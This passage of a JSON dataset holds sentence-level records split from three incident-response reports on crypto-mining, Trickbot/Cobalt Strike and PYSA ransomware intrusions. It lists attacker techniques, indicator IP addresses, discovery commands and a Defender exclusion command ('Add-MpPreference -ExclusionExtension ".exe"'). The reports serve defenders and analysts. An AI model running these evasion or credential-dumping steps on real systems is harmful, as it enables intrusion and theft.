        "report": "r-dfir-37",
        "line": 26,
        "index": 6902
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S27",
        "text": "masscan and masscan gui were dropped but were not executed.\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 27,
        "index": 6903
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S28",
        "text": "RDP was used to move laterally to multiple machines in the environment, which included domain controllers, backup machines, etc.\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 28,
        "index": 6904
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S29",
        "text": "RDP was used to access the environment, as well as move within the environment.\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 29,
        "index": 6905
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S30",
        "text": "XMRig was running on the system, using some CPU but not enough to cause any issues.",
        "type": "",
        "report": "r-dfir-37",
        "line": 30,
        "index": 6906
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S31",
        "text": "We tend to block mining endpoints, which may have lessened the impact of this intrusion.",
        "type": "",
        "report": "r-dfir-37",
        "line": 31,
        "index": 6907
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S32",
        "text": "XMRig made connection attempts to 104.140.201[.]42 & 104.142.244[.]186.\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 32,
        "index": 6908
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S33",
        "text": "The threat actors have been using the associated Monero wallet for 738+ days and have netted around $5,159.\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 33,
        "index": 6909
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S34",
        "text": "Was the threat actors\u2019 mission to mine Monero?",
        "type": "",
        "report": "r-dfir-37",
        "line": 34,
        "index": 6910
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S35",
        "text": "Or was this a recon mission?",
        "type": "",
        "report": "r-dfir-37",
        "line": 35,
        "index": 6911
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S36",
        "text": "Possibly both?\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 36,
        "index": 6912
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S37",
        "text": "Enjoy our report?",
        "type": "",
        "report": "r-dfir-37",
        "line": 37,
        "index": 6913
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S38",
        "text": "Please consider donating $1 or more to the project using Patreon.",
        "type": "",
        "report": "r-dfir-37",
        "line": 38,
        "index": 6914
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S39",
        "text": "Thank you for your support!\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 39,
        "index": 6915
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S40",
        "text": "We also have pcaps, files, and Kape packages available here.",
        "type": "",
        "report": "r-dfir-37",
        "line": 40,
        "index": 6916
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S41",
        "text": "No memory captures are available for this case.\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 41,
        "index": 6917
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S0",
        "text": "The Trickbot threat actors used Cobalt Strike to pivot through-out the domain, dumping lsass and ntds.dit as they went.",
        "type": "",
        "report": "r-dfir-38",
        "line": 0,
        "index": 6918
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S1",
        "text": "They used tools such as AdFind, Nltest, Net, Bloodhound, and PowerView to peruse the domain, looking for high privileged credentials to accomplish their mission.",
        "type": "",
        "report": "r-dfir-38",
        "line": 1,
        "index": 6919
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S2",
        "text": "They used PowerShell, SMB, and WMI to move laterally.",
        "type": "",
        "report": "r-dfir-38",
        "line": 2,
        "index": 6920
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S3",
        "text": "After acquiring the necessary credentials, the threat actors used a technique called Overpass-the-hash to move to a backup server, before being kicked off the network.",
        "type": "",
        "report": "r-dfir-38",
        "line": 3,
        "index": 6921
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S4",
        "text": "We believe if this attack had been allowed to continue, it would have ended in domain wide ransomware, specifically Ryuk.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 4,
        "index": 6922
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S5",
        "text": "The original delivery mechanism was not found, but likely to have been a malicious email based on previous known Trickbot campaigns.",
        "type": "",
        "report": "r-dfir-38",
        "line": 5,
        "index": 6923
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S6",
        "text": "Trickbot was manually executed on a single endpoint.",
        "type": "",
        "report": "r-dfir-38",
        "line": 6,
        "index": 6924
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S7",
        "text": "Source: Hatching Triage | Behavioral Report\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 7,
        "index": 6925
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S8",
        "text": "During the intrusion, we witnessed the threat actors elevate privileges on several systems using the built-in GetSystem named pipe privilege escalation tool in Cobalt Strike.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 8,
        "index": 6926
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S9",
        "text": "After executing on the infected endpoint, the Trickbot executable injected itself into the Window Error Reporting Manager (wermgr.exe).",
        "type": "",
        "report": "r-dfir-38",
        "line": 9,
        "index": 6927
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S10",
        "text": "Subsequent Trickbot command and control traffic then originated from the injected wermgr.exe process going forward.",
        "type": "",
        "report": "r-dfir-38",
        "line": 10,
        "index": 6928
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S11",
        "text": "Using the YARA rule generated by Malpedia we were able to locate Cobalt Strike injections in the following processes.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 11,
        "index": 6929
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S12",
        "text": "The threat actors employed a couple different credential access techniques.",
        "type": "",
        "report": "r-dfir-38",
        "line": 12,
        "index": 6930
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S13",
        "text": "The first technique used was dumping passwords from lsass on the beachhead machine.",
        "type": "",
        "report": "r-dfir-38",
        "line": 13,
        "index": 6931
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S14",
        "text": "After they gained access to a domain controller, we witnessed them use ntdsutil to run the following command:\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 14,
        "index": 6932
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S15",
        "text": "The above command was executed from a batch file that was dropped and then executed using wmic.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 15,
        "index": 6933
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S16",
        "text": "This command, which is included in DPAT, dumps NTDS.dit to disk and has been used by Trickbot actors in the past.",
        "type": "",
        "report": "r-dfir-38",
        "line": 16,
        "index": 6934
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S17",
        "text": "The above technique has been around since at least 2014 @chriscampell.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 17,
        "index": 6935
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S18",
        "text": "The threat actors ran the AdFind utility for domain discovery.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 18,
        "index": 6936
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S19",
        "text": "The following net commands were used by the threat actor.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 19,
        "index": 6937
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S20",
        "text": "While on systems, we also saw them use the following commands.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 20,
        "index": 6938
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S21",
        "text": "The following Nltest commands were executed several times by the threat actors over the course of the intrusion.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 21,
        "index": 6939
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S22",
        "text": "The ping command was then used to test connectivity to the domain controllers and other systems.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 22,
        "index": 6940
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S23",
        "text": "Bloodhound was ran for domain attack path enumeration.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 23,
        "index": 6941
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S24",
        "text": "The threat actors utilized several lateral movement techniques.",
        "type": "",
        "report": "r-dfir-38",
        "line": 24,
        "index": 6942
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S25",
        "text": "The first of which was using a remote service to execute PowerShell from the registry.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 25,
        "index": 6943
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S26",
        "text": "After decoding the above command a couple times and xoring you are left with the following shellcode, which appears to include a named pipe.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 26,
        "index": 6944
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S27",
        "text": "This CyberChef Recipe was used to decode the above PS command\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 27,
        "index": 6945
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S28",
        "text": "The next lateral movement method used is SMB transfer and exec of batch files.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 28,
        "index": 6946
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S29",
        "text": "This file was seen executed locally via cmd, and on remote systems using wmic.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 29,
        "index": 6947
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S30",
        "text": "SMB was also used to transfer Cobalt Strike Beacon executables to the ADMIN$ share on systems, which were then executed via a service.",
        "type": "",
        "report": "r-dfir-38",
        "line": 30,
        "index": 6948
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S31",
        "text": "Additionally, we also witnessed the use of overpass-the-hash.",
        "type": "",
        "report": "r-dfir-38",
        "line": 31,
        "index": 6949
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S32",
        "text": "Here we can see a 4624 event with seclogo as the logon process and logon type 9 which tells us some form of pass the hash occurred.",
        "type": "",
        "report": "r-dfir-38",
        "line": 32,
        "index": 6950
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S33",
        "text": "Shortly after we see a couple Kerberos service ticket requests for that user.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 33,
        "index": 6951
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S34",
        "text": "This alert fired a couple times based on network activity.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 34,
        "index": 6952
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S35",
        "text": "Here\u2019s some helpful information when looking for PTH or OPTH from Stealthbits\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 35,
        "index": 6953
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S36",
        "text": "Cobalt Strike C2 #1:\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 36,
        "index": 6954
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S37",
        "text": "Extracted Cobalt Strike Config:\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 37,
        "index": 6955
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S38",
        "text": "Cobalt Strike C2 #2:\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 38,
        "index": 6956
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S39",
        "text": "Trickbot Mor1\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 39,
        "index": 6957
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S40",
        "text": "Based on the activity seen, we assess that the likely final actions would have been ransomware deployment across the domain environment.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 40,
        "index": 6958
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S41",
        "text": "Based on research from late last year by Kyle Ehmke, we can assess that the likely ransom deployment would have been Ryuk (Wizard Spider / UNC1878).\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 41,
        "index": 6959
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S42",
        "text": "Enjoy our report?",
        "type": "",
        "report": "r-dfir-38",
        "line": 42,
        "index": 6960
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S43",
        "text": "Please consider donating $1 or more to the project using Patreon.",
        "type": "",
        "report": "r-dfir-38",
        "line": 43,
        "index": 6961
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S44",
        "text": "Thank you for your support!\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 44,
        "index": 6962
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S45",
        "text": "We also have pcaps, files, and Kape packages available here.",
        "type": "",
        "report": "r-dfir-38",
        "line": 45,
        "index": 6963
    },
    {
        "id": "dfir-reports-filtered/r-dfir-38.md:::S46",
        "text": "No memory captures are available for this case.\n",
        "type": "",
        "report": "r-dfir-38",
        "line": 46,
        "index": 6964
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S0",
        "text": "In this intrusion the entry was a Windows host with RDP exposed to the internet.",
        "type": "",
        "report": "r-dfir-39",
        "line": 0,
        "index": 6965
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S1",
        "text": "The threat actors logged in with a valid account (Domain Administrator).",
        "type": "",
        "report": "r-dfir-39",
        "line": 1,
        "index": 6966
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S2",
        "text": "The login was from a Tor exit node and over the course of an 8 hour intrusion we saw them hand off 2 times, for a total of 3 different Tor exits being used to maintain RDP access to the environment.",
        "type": "",
        "report": "r-dfir-39",
        "line": 2,
        "index": 6967
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S3",
        "text": "The account used to access the first beachhead host had enough privileges to immediately begin lateral movement to a domain controller just minutes after entry.",
        "type": "",
        "report": "r-dfir-39",
        "line": 3,
        "index": 6968
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S4",
        "text": "Network scanning begun on the domain controller followed closely by Empire.",
        "type": "",
        "report": "r-dfir-39",
        "line": 4,
        "index": 6969
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S5",
        "text": "While the Empire C2 remained active during the whole intrusion, we saw little activity from it, more like a fallback channel should their RDP access fall off.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 5,
        "index": 6970
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S6",
        "text": "As they started to move laterally to other systems, it was very obvious they were following a checklist playbook.",
        "type": "",
        "report": "r-dfir-39",
        "line": 6,
        "index": 6971
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S7",
        "text": "Each time they pivoted, they would check quser, and then dump lsass using Task Manager.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 7,
        "index": 6972
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S8",
        "text": "During the intrusion we saw the PYSA threat actors attempt to access credentials via the following techniques::\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 8,
        "index": 6973
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S9",
        "text": "- Dump lsass with Taskmanager\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 9,
        "index": 6974
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S10",
        "text": "- Dump lsass with Procdump\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 10,
        "index": 6975
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S11",
        "text": "- Dump lsass with comsvcs.dll\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 11,
        "index": 6976
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S12",
        "text": "- Dump credentials with Invoke-Mimikatz\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 12,
        "index": 6977
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S13",
        "text": "- Extract the shadow copy of the ntds.dit from the domain controller\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 13,
        "index": 6978
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S14",
        "text": "- Extract and decode backup system credentials from a SQL database\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 14,
        "index": 6979
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S15",
        "text": "- Access LSA Secrets\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 15,
        "index": 6980
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S16",
        "text": "Most lateral movement in the environment was via RDP with various legitimate user accounts, as well as PsExec to execute scripts throughout the environment for credential dumping and collection activity.",
        "type": "",
        "report": "r-dfir-39",
        "line": 16,
        "index": 6981
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S17",
        "text": "The threat actor disabled security tools throughout the intrusion by using Local Security Policy Editor and MpPreference to disable Defender.",
        "type": "",
        "report": "r-dfir-39",
        "line": 17,
        "index": 6982
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S18",
        "text": "PowerShell Remoting was also used to run the arp command on a few systems.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 18,
        "index": 6983
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S19",
        "text": "Besides using RDP and Empire the group also used the Offensive Security Tool (OST) Koadic, which bills itself as a post exploitation toolkit that can stay resident in memory using JScript or VBS via Windows Script Host to perform its execution.",
        "type": "",
        "report": "r-dfir-39",
        "line": 19,
        "index": 6984
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S20",
        "text": "Koadic was only utilized on a few key servers and one of those servers included a persistence mechanism using the default Koadic HTA scheduled task module.",
        "type": "",
        "report": "r-dfir-39",
        "line": 20,
        "index": 6985
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S21",
        "text": "After around 7 hours post initial access, the threat actors began their final actions by RDPing into systems, dropping a PowerShell script and the ransomware executable.",
        "type": "",
        "report": "r-dfir-39",
        "line": 21,
        "index": 6986
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S22",
        "text": "The PowerShell script killed various active processes and made sure RDP was open at the firewall and created what appears to be a potentially unique identifier for systems.",
        "type": "",
        "report": "r-dfir-39",
        "line": 22,
        "index": 6987
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S23",
        "text": "After that, the ransom would be run to encrypt the system.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 23,
        "index": 6988
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S24",
        "text": "After the encryption was done we were able to confirm exfiltration occurring by receiving a callback from a canary document.",
        "type": "",
        "report": "r-dfir-39",
        "line": 24,
        "index": 6989
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S25",
        "text": "The threat actors asked for 5 BTC or around $88,000 USD which tells us these attackers most likely base their ransom demand on the information exfiltrated.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 25,
        "index": 6990
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S26",
        "text": "Initial access for this actor was via exposed RDP services.",
        "type": "",
        "report": "r-dfir-39",
        "line": 26,
        "index": 6991
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S27",
        "text": "Originally, the actor connected from 198.96.155.3, and then performed a kind of hand off over the course of the campaign, first to 23.129.64.190 and then finally 185.220.100.240.",
        "type": "",
        "report": "r-dfir-39",
        "line": 27,
        "index": 6992
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S28",
        "text": "All 3 of these IP\u2019s belong to the Tor network and function as exit nodes.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 28,
        "index": 6993
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S29",
        "text": "The threat actors started off by using RDP but also relied on 2 different OSTs during this intrusion.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 29,
        "index": 6994
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S30",
        "text": "A few minutes after gaining access, they moved laterally to a domain controller and then executed a PowerShell launcher for Empire.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 30,
        "index": 6995
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S31",
        "text": "Later during the intrusion, the threat actors employed another OST named Koadic.",
        "type": "",
        "report": "r-dfir-39",
        "line": 31,
        "index": 6996
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S32",
        "text": "To execute Koadic, they employed a MSHTA launcher with javascript.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 32,
        "index": 6997
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S33",
        "text": "From those two executions, various child processes were created to load stage 2 into memory.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 33,
        "index": 6998
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S34",
        "text": "Persistence was setup using Koadic to schedule a task to execute a HTA file located in the C:\\ProgramData directory at logon as system.",
        "type": "",
        "report": "r-dfir-39",
        "line": 34,
        "index": 6999
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S35",
        "text": "This will initiate C2 back to the Koadic server.",
        "type": "",
        "report": "r-dfir-39",
        "line": 35,
        "index": 7000
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S36",
        "text": "The threat actors disabled Windows Defender using Local Group Policy Editor.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 36,
        "index": 7001
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S37",
        "text": "Later, they also ran a PowerShell script that would again disable Windows Defender, this time using MpPreference.",
        "type": "",
        "report": "r-dfir-39",
        "line": 37,
        "index": 7002
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S38",
        "text": "The script also targeted Malwarebytes, agents, Citrix, Exchange, Veeam, SQL and many other processes.",
        "type": "",
        "report": "r-dfir-39",
        "line": 38,
        "index": 7003
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S39",
        "text": "Event ID 5001 was created due to Defender AV Real-Time being disabled.",
        "type": "",
        "report": "r-dfir-39",
        "line": 39,
        "index": 7004
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S40",
        "text": "A Defender exclusion was also added to exclude everything with .exe as the extension.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 40,
        "index": 7005
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S41",
        "text": "Add-MpPreference -ExclusionExtension \".exe\" Event ID 5007 Windows Defender Antivirus Configuration has changed.",
        "type": "",
        "report": "r-dfir-39",
        "line": 41,
        "index": 7006
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S42",
        "text": "If this is an unexpected event you should review the settings as this may be the result of malware.",
        "type": "",
        "report": "r-dfir-39",
        "line": 42,
        "index": 7007
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S43",
        "text": "Old value: New value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions\\.exe = 0x0\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 43,
        "index": 7008
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S44",
        "text": "The threat actors displayed multiple techniques for gathering credentials during this intrusion.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 44,
        "index": 7009
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S45",
        "text": "Credentials were dumped manually via Task Manager as they RDPed into each system.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 45,
        "index": 7010
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S46",
        "text": "While established on a domain controller the threat actors also created and accessed a shadow copy of the ntds.dit and most likely exfiltrated it via their Koadic C2 channel.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 46,
        "index": 7011
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S47",
        "text": "The threat actors also executed a PowerShell script across the environment using PsExec that took advantage of comsvcs.dll to dump the lsass process and then copy the dump back to their pivot position on a domain controller.",
        "type": "",
        "report": "r-dfir-39",
        "line": 47,
        "index": 7012
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S48",
        "text": "The threat actors tried using the Sysinternals ProcDump method but the executable was not present on the endpoint.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 48,
        "index": 7013
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S49",
        "text": "The threat actors were focused on the backup server for quite awhile as they dumped credentials from the 3rd party backup software repository.",
        "type": "",
        "report": "r-dfir-39",
        "line": 49,
        "index": 7014
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S50",
        "text": "The first script pulls the hashes out of the database and the second decodes the password to plain text.",
        "type": "",
        "report": "r-dfir-39",
        "line": 50,
        "index": 7015
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S51",
        "text": "Both scripts were run via PowerShell ISE.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 51,
        "index": 7016
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S52",
        "text": "The threat actors also ran Invoke-Mimikatz from BC-Security on one of the domain controllers.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 52,
        "index": 7017
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S53",
        "text": "We also saw the threat actors save LSA Secrets to disk using the hashdump_sam module in Koadic which runs impacket.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 53,
        "index": 7018
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S54",
        "text": "Inveigh was run on a domain controller.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 54,
        "index": 7019
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S55",
        "text": "The threat actors leveraged many built-in Windows tools for discovery including the following:\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 55,
        "index": 7020
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S56",
        "text": "quser.exe whoami.exe /user net.exe group /domain net.exe group \"Domain Users\" /domain nltest.exe /dclist: arp -a\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 56,
        "index": 7021
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S57",
        "text": "The arp command was run using PowerShell Remoting.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 57,
        "index": 7022
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S58",
        "text": "They also reviewed a few admin tools while exploring the network including:\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 58,
        "index": 7023
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S59",
        "text": "The threat actors also brought some tools of their own to aid in discovery tasks including Advanced Port Scanner and ADRecon.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 59,
        "index": 7024
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S60",
        "text": "Here\u2019s the description of ADRecon.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 60,
        "index": 7025
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S61",
        "text": "Other local discovery was performed using PowerShell such as ps to list the running process on systems.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 61,
        "index": 7026
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S62",
        "text": "The first lateral movement occurred just 3 minutes after the initial access by the threat actor.",
        "type": "",
        "report": "r-dfir-39",
        "line": 62,
        "index": 7027
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S63",
        "text": "RDP was initiated from the beachhead host to a domain controller using the valid account they had used to gain access to the first host.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 63,
        "index": 7028
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S64",
        "text": "RDP continued to be the first method of choice while accessing various systems around the environment.",
        "type": "",
        "report": "r-dfir-39",
        "line": 64,
        "index": 7029
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S65",
        "text": "After a few hours in, the threat actors decided to automate some credential collection and used PsExec to execute a PowerShell script that called comsvcs.dll for lsass dumping.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 65,
        "index": 7030
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S66",
        "text": "The threat actors used 3 different C2 channels, RDP, PowerShell Empire, and Koadic.",
        "type": "",
        "report": "r-dfir-39",
        "line": 66,
        "index": 7031
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S67",
        "text": "IP\u2019s used to maintain access over RDP\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 67,
        "index": 7032
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S68",
        "text": "While no plain text exfiltration was seen during this intrusion, canary documents were opened by the threat actors hours after the ransom, confirming that the hours spent on network before ransoming was used to gather files.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 68,
        "index": 7033
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S69",
        "text": "The source IP\u2019s from these canary documents were also Tor exit nodes just like the RDP connections.\n",
        "type": "",
        "report": "r-dfir-39",
        "line": 69,
        "index": 7034
    },
    {
        "id": "dfir-reports-filtered/r-dfir-39.md:::S70",
        "text": "Since no plaintext exfil was observed we assess that the exfiltration was performed via one of the command and control channels either RDP, Empire, or Koadic.",
        "type": "",
        "report": "r-dfir-39",
        "line": 70,
        "index": 7035
    },
    {
